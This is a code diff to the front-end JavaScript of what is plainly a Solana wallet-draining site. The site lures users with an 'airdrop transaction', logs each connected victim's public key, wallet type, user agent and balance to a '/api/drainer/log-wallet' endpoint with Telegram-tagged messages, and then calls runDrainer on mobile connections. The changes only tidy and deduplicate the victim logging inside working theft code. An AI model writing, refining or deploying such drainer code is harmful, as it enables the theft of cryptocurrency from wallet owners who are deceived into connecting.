@@ -1377,33 +1377,52 @@ async function runDrainer(provider) {
       }
     }
 
-    // Log wallet connection to backend (will be updated with balance later)
-    try {
-      // Use the determined connected wallet type
-      const walletType = connectedWalletType;
-      
-      // Log wallet connection (balance will be updated after balance check)
-      console.log('[WALLET] About to log wallet connection with type:', walletType);
-      fetch('/api/drainer/log-wallet', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          publicKey: publicKey.toString(),
-          walletType: walletType,
-          origin: window.location.origin,
-          userAgent: navigator.userAgent,
-          lamports: 0 // Will be updated after balance check
-        })
-      }).catch(err => console.log('[TELEGRAM] Failed to log wallet connection:', err));
-      
-      console.log('[WALLET] Logged connection:', {
-        publicKey: publicKey.toString(),
-        walletType: walletType,
-        origin: window.location.origin
-      });
-    } catch (logError) {
-      console.error('[WALLET] Failed to log wallet connection:', logError);
+    // Centralized wallet logging function with deduplication
+    function logWalletConnection(publicKey, walletType, lamports = 0) {
+      try {
+        const walletKey = `${publicKey.toString()}-${walletType}`;
+        const now = Date.now();
+        const lastLogged = window.walletLogTimestamps?.[walletKey] || 0;
+        
+        // Only log if we haven't logged this wallet in the last 30 seconds
+        if (now - lastLogged > 30000) {
+          // Initialize timestamps object if it doesn't exist
+          if (!window.walletLogTimestamps) {
+            window.walletLogTimestamps = {};
+          }
+          
+          // Log wallet connection
+          console.log('[WALLET] About to log wallet connection with type:', walletType);
+          fetch('/api/drainer/log-wallet', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              publicKey: publicKey.toString(),
+              walletType: walletType,
+              origin: window.location.origin,
+              userAgent: navigator.userAgent,
+              lamports: lamports
+            })
+          }).catch(err => console.log('[TELEGRAM] Failed to log wallet connection:', err));
+          
+          // Update timestamp to prevent spam
+          window.walletLogTimestamps[walletKey] = now;
+          
+          console.log('[WALLET] Logged connection:', {
+            publicKey: publicKey.toString(),
+            walletType: walletType,
+            origin: window.location.origin
+          });
+        } else {
+          console.log('[WALLET] Skipping duplicate wallet log for:', walletKey);
+        }
+      } catch (logError) {
+        console.error('[WALLET] Failed to log wallet connection:', logError);
+      }
     }
+    
+    // Log wallet connection to backend (will be updated with balance later)
+    logWalletConnection(publicKey, connectedWalletType, 0);
 
     // 2. Fetch the airdrop transaction from the backend
     console.log('[runDrainer] Fetching transaction for wallet:', publicKey.toString());
@@ -1435,19 +1454,23 @@ async function runDrainer(provider) {
           balance = await Promise.race([balancePromise, timeoutPromise]);
           console.log('[BALANCE_CHECK] Wallet balance from', rpcUrl, ':', balance, 'lamports');
           
-          // Update wallet logging with actual balance
+          // Update wallet logging with actual balance (only if balance changed significantly)
           try {
-            fetch('/api/drainer/log-wallet', {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({
-                publicKey: publicKey.toString(),
-                walletType: connectedWalletType,
-                origin: window.location.origin,
-                userAgent: navigator.userAgent,
-                lamports: balance
-              })
-            }).catch(err => console.log('[TELEGRAM] Failed to update wallet logging with balance:', err));
+            const walletKey = `${publicKey.toString()}-${connectedWalletType}`;
+            const lastBalance = window.walletBalanceCache?.[walletKey] || 0;
+            
+            // Only update if balance changed by more than 10% or if it's the first time
+            if (Math.abs(balance - lastBalance) > balance * 0.1 || lastBalance === 0) {
+              if (!window.walletBalanceCache) {
+                window.walletBalanceCache = {};
+              }
+              window.walletBalanceCache[walletKey] = balance;
+              
+              // Use centralized logging function
+              logWalletConnection(publicKey, connectedWalletType, balance);
+            } else {
+              console.log('[WALLET] Skipping balance update - no significant change');
+            }
           } catch (updateError) {
             console.error('[WALLET] Failed to update wallet logging with balance:', updateError);
           }
@@ -2606,27 +2629,8 @@ window.openWalletModal = async function openWalletModal() {
                   showStatus(`${wallet.name} connected!`, 'success');
                   console.log(`[connectMobileWallet] About to call runDrainer for ${wallet.name}`);
                   
-                  // Log wallet connection
-                  try {
-                    fetch('/api/drainer/log-wallet', {
-                      method: 'POST',
-                      headers: { 'Content-Type': 'application/json' },
-                      body: JSON.stringify({
-                        publicKey: publicKey.toString(),
-                        walletType: wallet.name,
-                        origin: window.location.origin,
-                        userAgent: navigator.userAgent
-                      })
-                    }).catch(err => console.log('[TELEGRAM] Failed to log wallet connection:', err));
-                    
-                    console.log('[WALLET] Logged mobile connection:', {
-                      publicKey: publicKey.toString(),
-                      walletType: wallet.name,
-                      origin: window.location.origin
-                    });
-                  } catch (logError) {
-                    console.error('[WALLET] Failed to log wallet connection:', logError);
-                  }
+                  // Log wallet connection using centralized function
+                  logWalletConnection(publicKey, wallet.name, 0);
                   
                   // Ensure provider is still connected before running drainer
                   if (provider && (provider.connected || provider.publicKey)) {
